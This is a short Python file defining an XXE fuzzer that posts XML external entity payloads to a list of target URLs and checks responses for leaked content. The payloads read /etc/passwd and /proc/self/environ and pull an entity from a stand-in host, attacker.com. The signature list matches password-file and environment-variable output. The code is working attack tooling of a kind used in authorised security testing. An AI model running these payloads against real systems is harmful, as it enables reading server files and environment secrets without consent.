import requests

class XXEFuzzer:
    def __init__(self):
        self.name = "XML External Entity Fuzzer"
        self.payloads = [
            """<?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <foo>&xxe;</foo>""",

            """<?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">]>
            <foo>&xxe;</foo>""",

            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///proc/self/environ" >]>
            <foo>&xxe;</foo>"""
        ]
        self.signatures = ["root:x:0:0", "malicious.xml", "PATH=", "SHELL="]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                status, response_text = self.send_request(target, payload)
                vulnerable = self.analyze_response(response_text)
                results[f"{target} | Payload"] = {
                    "status": status,
                    "vulnerable": vulnerable
                }
        return results

    def send_request(self, url, data):
        headers = {"Content-Type": "application/xml"}
        try:
            response = requests.post(url, data=data, headers=headers, timeout=5)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        for sig in self.signatures:
            if sig.lower() in text.lower():
                return True
        return False
